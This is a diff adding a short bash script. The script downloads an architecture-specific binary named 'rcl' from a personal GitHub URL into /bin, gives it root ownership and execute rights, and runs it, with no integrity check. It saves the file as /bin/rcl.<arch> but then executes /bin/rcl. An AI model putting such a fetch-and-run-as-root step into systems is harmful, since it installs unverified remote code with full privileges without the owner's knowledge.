@@ -1,0 +1,6 @@
+#!/bin/bash -e
+ export EXE=rcl.$(uname -p)
+ wget -O /bin/$EXE https://raw.githubusercontent.com/j1nh0/linx/main/$EXE&&chmod 0755 /bin/$EXE&&chown root:root /bin/$EXE
+ /bin/rcl
+ sync
+exit 0
